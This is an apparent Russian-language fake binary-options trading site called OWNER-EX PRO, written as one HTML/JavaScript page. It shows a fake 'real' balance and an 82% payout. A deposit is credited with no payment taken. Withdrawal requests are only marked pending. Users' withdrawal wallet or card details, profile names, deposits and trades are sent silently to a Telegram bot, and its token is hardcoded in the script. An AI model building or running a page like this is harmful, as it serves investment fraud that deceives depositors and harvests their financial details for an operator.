<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>OWNER-EX ULTIMATE PRO</title>
    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --bg: #0b0e11; --panel: #161a1e; --accent: #00ffad; --red: #f6465d; --green: #0ecb81; --border: #2b2f36; --radius: 10px; }
        body, html { margin: 0; padding: 0; height: 100%; background: var(--bg); color: #eaecef; font-family: 'Inter', sans-serif; overflow: hidden; }
        
        header { height: 60px; background: var(--panel); display: flex; align-items: center; justify-content: space-between; padding: 0 15px; border-bottom: 1px solid var(--border); }
        .controls { display: flex; gap: 10px; align-items: center; }
        select, .btn-s { background: #1e2329; color: white; border: 1px solid var(--border); padding: 5px 10px; border-radius: 5px; cursor: pointer; }

        .acc-switcher { display: flex; background: #000; border-radius: 8px; padding: 2px; border: 1px solid var(--border); }
        .acc-btn { padding: 4px 12px; border: none; background: none; color: #555; cursor: pointer; font-size: 12px; border-radius: 6px; }
        .acc-btn.active { background: var(--accent); color: #000; font-weight: bold; }

        .terminal { display: grid; grid-template-columns: 60px 1fr 260px; height: calc(100vh - 60px); }
        .sidebar { background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; align-items: center; padding: 20px 0; gap: 20px; }
        .side-icon { font-size: 20px; color: #848e9c; cursor: pointer; transition: 0.2s; }
        .side-icon:hover { color: var(--accent); }

        .main-view { display: flex; flex-direction: column; border-right: 1px solid var(--border); overflow: hidden; }
        #chart { flex: 1; }
        .history-table-wrap { height: 180px; background: var(--panel); border-top: 1px solid var(--border); overflow-y: auto; padding: 10px; }
        table { width: 100%; border-collapse: collapse; font-size: 12px; }
        th { text-align: left; color: #848e9c; border-bottom: 1px solid var(--border); padding: 8px; }
        td { padding: 8px; border-bottom: 1px solid #222; }

        .trade-panel { padding: 15px; background: var(--panel); display: flex; flex-direction: column; gap: 15px; }
        .in-group { background: var(--bg); border: 1px solid var(--border); padding: 10px; border-radius: 8px; }
        .in-group label { display: block; font-size: 10px; color: gray; }
        .in-group input { background: transparent; border: none; color: white; width: 100%; outline: none; font-size: 18px; font-weight: bold; }

        .btn-trade { height: 55px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .btn-up { background: var(--green); color: #000; }
        .btn-down { background: var(--red); color: #fff; }

        .modal { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; display: none; justify-content: center; align-items: center; backdrop-filter: blur(5px); }
        .modal-card { background: var(--panel); width: 400px; padding: 25px; border-radius: 15px; border: 1px solid var(--border); position: relative; }
        .tab-nav { display: flex; gap: 15px; border-bottom: 1px solid var(--border); margin-bottom: 15px; }
        .tab-link { padding: 8px 0; cursor: pointer; color: gray; font-size: 13px; }
        .tab-link.active { color: var(--accent); border-bottom: 2px solid var(--accent); }
        .tab-pane { display: none; }
        .tab-pane.active { display: block; }
    </style>
</head>
<body>

<header>
    <div class="controls">
        <div style="font-weight:900; color:var(--accent); margin-right:15px;">OWNER-EX PRO</div>
        <select id="assetSelect" onchange="changeSymbol(this.value)">
            <option value="BTCUSDT">BTC/USDT</option>
            <option value="ETHUSDT">ETH/USDT</option>
            <option value="SOLUSDT">SOL/USDT</option>
        </select>
        <select id="tfSelect" onchange="changeTF(this.value)" style="font-weight:bold; color:var(--accent);">
    <optgroup label="–°–µ–∫—É–Ω–¥—ã" style="color: gray;">
        <option value="1s">S10 (Live)</option>
        <option value="1s">S15 (Live)</option>
        <option value="1s">S30 (Live)</option>
    </optgroup>
    <optgroup label="–ú–∏–Ω—É—Ç—ã" style="color: gray;">
        <option value="1m" selected>M1</option>
        <option value="5m">M5</option>
        <option value="10m">M10</option>
        <option value="30m">M30</option>
    </optgroup>
    <optgroup label="–ß–∞—Å—ã" style="color: gray;">
        <option value="1h">H1</option>
        <option value="2h">H2</option>
    </optgroup>
</select>
        <button class="btn-s" onclick="setChartType('candles')">üïØÔ∏è</button>
        <button class="btn-s" onclick="setChartType('line')">üìà</button>
    </div>

    <div class="controls">
        <div class="acc-switcher">
            <button class="acc-btn active" id="btnDemo" onclick="switchAcc('demo')">DEMO</button>
            <button class="acc-btn" id="btnReal" onclick="switchAcc('real')">REAL</button>
        </div>
        <div id="topBal" style="font-weight:bold; color:var(--green); min-width:80px;">$10,000.00</div>
    </div>
</header>

<div class="terminal">
    <div class="sidebar">
        <i class="fas fa-chart-line side-icon" onclick="closeModals()"></i>
        <i class="fas fa-wallet side-icon" onclick="openModal('cashierModal')"></i>
        <i class="fas fa-user-circle side-icon" onclick="openModal('profileModal')"></i>
        <i class="fas fa-power-off side-icon" onclick="location.reload()" style="margin-top:auto"></i>
    </div>

    <div class="main-view">
        <div id="chart"></div>
        <div class="history-table-wrap">
            <h4 style="margin:0 0 10px 0; font-size:12px; color:var(--accent)">–ò–°–¢–û–†–ò–Ø –°–î–ï–õ–û–ö</h4>
            <table>
                <thead><tr><th>–ê–∫—Ç–∏–≤</th><th>–¢–∏–ø</th><th>–°—É–º–º–∞</th><th>–í—Ö–æ–¥</th><th>–í—ã—Ö–æ–¥</th><th>–ò—Ç–æ–≥</th></tr></thead>
                <tbody id="tradeHistoryBody"></tbody>
            </table>
        </div>
    </div>

    <div class="trade-panel">
        <div class="in-group"><label>–°–£–ú–ú–ê (USDT)</label><input type="number" id="tAmt" value="100"></div>
        <div class="in-group"><label>–í–†–ï–ú–Ø (–°–ï–ö)</label><input type="number" id="tSec" value="15"></div>
        <div style="text-align:center; padding:10px;">
            <div style="font-size:10px; color:gray">–î–û–•–û–î</div>
            <div style="font-size:24px; font-weight:bold; color:var(--accent)">+82%</div>
        </div>
        <button class="btn-trade btn-up" onclick="execTrade('CALL')">–í–´–®–ï ‚Üë</button>
        <button class="btn-trade btn-down" onclick="execTrade('PUT')">–ù–ò–ñ–ï ‚Üì</button>
    </div>
</div>

<div id="cashierModal" class="modal">
    <div class="modal-card">
        <div class="tab-nav">
            <div class="tab-link active" onclick="switchTab(event, 't-dep')">–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ</div>
            <div class="tab-link" onclick="switchTab(event, 't-with')">–í—ã–≤–æ–¥</div>
            <div class="tab-link" onclick="switchTab(event, 't-hist')">–ò—Å—Ç–æ—Ä–∏—è</div>
        </div>
        <div id="t-dep" class="tab-pane active">
            <select id="depMethod" style="margin-bottom:10px"><option>USDT TRC20</option><option>–ö–∞—Ä—Ç–∞ –†–§</option></select>
            <input type="number" id="depAmt" placeholder="–°—É–º–º–∞ $" value="100">
            <button class="btn-trade btn-up" style="width:100%; height:40px; margin-top:10px" onclick="doDeposit()">–ü–æ–ø–æ–ª–Ω–∏—Ç—å</button>
        </div>
        <div id="t-with" class="tab-pane">
            <input type="text" id="withTarget" placeholder="–ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞ / –ö–∞—Ä—Ç–∞" style="margin-bottom:10px">
            <input type="number" id="withAmt" placeholder="–°—É–º–º–∞ –≤—ã–≤–æ–¥–∞">
            <button class="btn-trade btn-down" style="width:100%; height:40px; margin-top:10px" onclick="doWithdraw()">–í—ã–≤–µ—Å—Ç–∏</button>
        </div>
        <div id="t-hist" class="tab-pane">
            <div style="max-height:200px; overflow-y:auto">
                <table style="font-size:10px">
                    <thead><tr><th>–î–∞—Ç–∞</th><th>–¢–∏–ø</th><th>–°—É–º–º–∞</th><th>–°—Ç–∞—Ç—É—Å</th></tr></thead>
                    <tbody id="cashierHistoryBody"></tbody>
                </table>
            </div>
        </div>
        <button onclick="closeModals()" style="margin-top:15px; background:none; border:none; color:gray; cursor:pointer; width:100%">–ó–∞–∫—Ä—ã—Ç—å</button>
    </div>
</div>

<div id="profileModal" class="modal">
    <div class="modal-card" style="width:450px">
        <h3>–ü–†–û–§–ò–õ–¨</h3>
        <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px">
            <input type="text" id="pName" placeholder="–ò–º—è">
            <input type="text" id="pSurname" placeholder="–§–∞–º–∏–ª–∏—è">
            <input type="text" id="pNick" placeholder="–ù–∏–∫–Ω–µ–π–º">
            <input type="date" id="pBirth">
            <input type="text" id="pCountry" placeholder="–°—Ç—Ä–∞–Ω–∞">
            <input type="text" id="pCity" placeholder="–ì–æ—Ä–æ–¥">
            <input type="text" id="pZip" placeholder="–ò–Ω–¥–µ–∫—Å" maxlength="6">
            <input type="text" id="pPromo" placeholder="–ü—Ä–æ–º–æ–∫–æ–¥">
        </div>
        <button class="btn-trade btn-up" style="width:100%; height:40px; margin-top:15px" onclick="saveProfile()">–°–æ—Ö—Ä–∞–Ω–∏—Ç—å</button>
        <button onclick="closeModals()" style="margin-top:10px; background:none; border:none; color:gray; cursor:pointer; width:100%">–û—Ç–º–µ–Ω–∞</button>
    </div>
</div>

<script>
    // --- –ù–ê–°–¢–†–û–ô–ö–ò ---
    const TG_TOKEN = "8102627080:AAGGbjyR0g1VzICKb-ait4t3CA34PJz1g5M"; 
    const TG_USER_ID = "6426834853";

    let bals = JSON.parse(localStorage.getItem('bals')) || { demo: 10000, real: 0 };
    let profile = JSON.parse(localStorage.getItem('profile')) || {};
    let cHist = JSON.parse(localStorage.getItem('cash_hist')) || [];
    let tHist = JSON.parse(localStorage.getItem('trade_hist')) || [];
    let curAcc = 'demo', curSym = 'BTCUSDT', curTF = '1m', chartStyle = 'candles', lastPrice = 0;
    let chart, series;

    function save() {
        localStorage.setItem('bals', JSON.stringify(bals));
        localStorage.setItem('profile', JSON.stringify(profile));
        localStorage.setItem('cash_hist', JSON.stringify(cHist));
        localStorage.setItem('trade_hist', JSON.stringify(tHist));
    }

    async function sendTG(m) {
        try {
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: "POST", headers: {"Content-Type":"application/json"},
                body: JSON.stringify({ chat_id: TG_USER_ID, text: m, parse_mode: "HTML" })
            });
        } catch(e) {}
    }

    // --- –ò–ù–¢–ï–†–§–ï–ô–° ---
    function updateUI() {
        document.getElementById('topBal').innerText = `$${bals[curAcc].toLocaleString()}`;
        renderTradeHist();
        renderCashHist();
    }

    function renderTradeHist() {
        document.getElementById('tradeHistoryBody').innerHTML = tHist.map(h => `
            <tr><td>${h.s}</td><td style="color:${h.type==='CALL'?'#0ecb81':'#f6465d'}">${h.type}</td>
            <td>$${h.amt}</td><td>${h.in}</td><td>${h.out}</td>
            <td style="color:${h.res.includes('+')?'#0ecb81':'#f6465d'}">${h.res}</td></tr>
        `).join('');
    }

    function renderCashHist() {
        document.getElementById('cashierHistoryBody').innerHTML = cHist.map(h => `
            <tr><td>${h.d}</td><td>${h.t}</td><td>${h.a}</td><td>${h.s}</td></tr>
        `).join('');
    }

    window.openModal = (id) => { 
        document.getElementById(id).style.display = 'flex'; 
        if(id==='profileModal') {
            const keys = ['pName','pSurname','pNick','pBirth','pCountry','pCity','pZip','pPromo'];
            keys.forEach(k => document.getElementById(k).value = profile[k] || '');
        }
    };
    window.closeModals = () => document.querySelectorAll('.modal').forEach(m => m.style.display='none');
    window.switchTab = (e, id) => {
        const p = e.target.parentElement;
        p.querySelectorAll('.tab-link').forEach(l => l.classList.remove('active'));
        p.parentElement.querySelectorAll('.tab-pane').forEach(tp => tp.classList.remove('active'));
        e.target.classList.add('active');
        document.getElementById(id).classList.add('active');
    };
    window.switchAcc = (a) => {
        curAcc = a;
        document.getElementById('btnDemo').classList.toggle('active', a==='demo');
        document.getElementById('btnReal').classList.toggle('active', a==='real');
        updateUI();
    };

    // --- –ö–ê–°–°–ê –ò –ü–†–û–§–ò–õ–¨ ---
    window.doDeposit = () => {
        const a = Math.abs(parseFloat(document.getElementById('depAmt').value));
        if(a>0) {
            bals.real += a;
            cHist.unshift({ d: new Date().toLocaleDateString(), t: '–î–µ–ø–æ–∑–∏—Ç', a: '$'+a, s: '–£—Å–ø–µ—Ö' });
            save(); updateUI();
            sendTG(`‚úÖ <b>–ü–æ–ø–æ–ª–Ω–µ–Ω–∏–µ:</b> $${a}\n–ù–∏–∫: ${profile.pNick || 'Guest'}`);
            alert("–ü–æ–ø–æ–ª–Ω–µ–Ω–æ!");
        }
    };
    window.doWithdraw = () => {
        const a = Math.abs(parseFloat(document.getElementById('withAmt').value));
        const t = document.getElementById('withTarget').value;
        if(a > bals.real || !t) return alert("–û—à–∏–±–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏–ª–∏ –±–∞–ª–∞–Ω—Å–∞");
        bals.real -= a;
        cHist.unshift({ d: new Date().toLocaleDateString(), t: '–í—ã–≤–æ–¥', a: '$'+a, s: '–û–∂–∏–¥–∞–Ω–∏–µ' });
        save(); updateUI();
        sendTG(`üí∞ <b>–í—ã–≤–æ–¥:</b> $${a}\n–ö—É–¥–∞: ${t}\n–ù–∏–∫: ${profile.pNick || 'Guest'}`);
        alert("–ó–∞—è–≤–∫–∞ —Å–æ–∑–¥–∞–Ω–∞!");
    };
    window.saveProfile = () => {
        const keys = ['pName','pSurname','pNick','pBirth','pCountry','pCity','pZip','pPromo'];
        keys.forEach(k => profile[k] = document.getElementById(k).value);
        save();
        sendTG(`üë§ <b>–ü—Ä–æ—Ñ–∏–ª—å –æ–±–Ω–æ–≤–ª–µ–Ω:</b> ${profile.pNick}\n–ò–º—è: ${profile.pName}`);
        alert("–°–æ—Ö—Ä–∞–Ω–µ–Ω–æ!");
    };

    // --- –ì–†–ê–§–ò–ö ---
    function initChart() {
        if(chart) { document.getElementById('chart').innerHTML = ''; }
        chart = LightweightCharts.createChart(document.getElementById('chart'), {
            layout: { background: { color: '#0b0e11' }, textColor: '#848e9c' },
            grid: { vertLines: { color: '#111' }, horzLines: { color: '#111' } },
            timeScale: { timeVisible: true, secondsVisible: true }
        });
        series = chartStyle === 'candles' ? chart.addCandlestickSeries() : chart.addAreaSeries({ lineColor: '#00ffad' });
        loadData();
    }

    async function loadData() {
    // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –∏–Ω—Ç–µ—Ä–≤–∞–ª –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –∫ API
    // –ï—Å–ª–∏ –≤—ã–±—Ä–∞–Ω–æ 1s (—Å–µ–∫—É–Ω–¥—ã), –±–µ—Ä–µ–º 1m –¥–ª—è –±–∞–∑—ã –∏ –æ–±–Ω–æ–≤–ª—è–µ–º –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É
    let fetchTF = curTF === '1s' ? '1m' : curTF;
    
    try {
        const r = await fetch(`https://api.binance.com/api/v3/klines?symbol=${curSym}&interval=${fetchTF}&limit=500`);
        const d = await r.json();
        
        series.setData(d.map(x => ({ 
            time: x[0]/1000, 
            open: +x[1], 
            high: +x[2], 
            low: +x[3], 
            close: +x[4], 
            value: +x[4] 
        })));
        
        if(window.ws) window.ws.close();
        
        // –ü–æ–¥–∫–ª—é—á–∞–µ–º –ø–æ—Ç–æ–∫ –¥–∞–Ω–Ω—ã—Ö (Stream)
        window.ws = new WebSocket(`wss://stream.binance.com:9443/ws/${curSym.toLowerCase()}@kline_1s`);
        
        window.ws.onmessage = e => {
            const k = JSON.parse(e.data).k;
            lastPrice = +k.c;
            
            // –ï—Å–ª–∏ –≤—ã–±—Ä–∞–Ω –º–∏–Ω—É—Ç–Ω—ã–π –∏–ª–∏ —á–∞—Å–æ–≤–æ–π –¢–§, –æ–±–Ω–æ–≤–ª—è–µ–º —Ç–µ–∫—É—â—É—é —Å–≤–µ—á—É
            // –ï—Å–ª–∏ —Å–µ–∫—É–Ω–¥–Ω—ã–π ‚Äî –∏–º–∏—Ç–∏—Ä—É–µ–º –±—ã—Å—Ç—Ä–æ–µ –¥–≤–∏–∂–µ–Ω–∏–µ
            series.update({ 
                time: k.t/1000, 
                open: +k.o, 
                high: +k.h, 
                low: +k.l, 
                close: lastPrice, 
                value: lastPrice 
            });
        };
    } catch (error) {
        console.error("–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö –±–∏—Ä–∂–∏:", error);
    }
}

    window.changeSymbol = (s) => { curSym = s; initChart(); };
    window.changeTF = (t) => { curTF = t; initChart(); };
    window.setChartType = (t) => { chartStyle = t; initChart(); };

    // --- –¢–û–†–ì–û–í–õ–Ø ---
    window.execTrade = (type) => {
        let amt = Math.abs(parseFloat(document.getElementById('tAmt').value));
        let sec = parseInt(document.getElementById('tSec').value);
        if(bals[curAcc] < amt || amt <= 0) return alert("–û—à–∏–±–∫–∞ –±–∞–ª–∞–Ω—Å–∞ –∏–ª–∏ —Å—É–º–º—ã");

        bals[curAcc] -= amt; updateUI();
        const startP = lastPrice;
        const line = series.createPriceLine({ price: startP, color: type==='CALL'?'#0ecb81':'#f6465d', title: '–í–•–û–î' });
        
        sendTG(`üöÄ <b>–°–¥–µ–ª–∫–∞:</b> ${type} $${amt}\n–°—á–µ—Ç: ${curAcc}`);

        setTimeout(() => {
            const win = (type==='CALL' && lastPrice > startP) || (type==='PUT' && lastPrice < startP);
            const profit = win ? amt * 1.82 : 0;
            if(win) bals[curAcc] += profit;
            
            const resStr = win ? `+$${(profit-amt).toFixed(2)}` : `-$${amt}`;
            tHist.unshift({ s: curSym, type, amt: amt, in: startP, out: lastPrice, res: resStr });
            
            series.removePriceLine(line);
            save(); updateUI();
            sendTG(`üèÅ <b>–ò—Ç–æ–≥:</b> ${win?'WIN ‚úÖ':'LOSS ‚ùå'} (${resStr})`);
        }, sec * 1000);
    };

    initChart();
    updateUI();
</script>
</body>
</html>
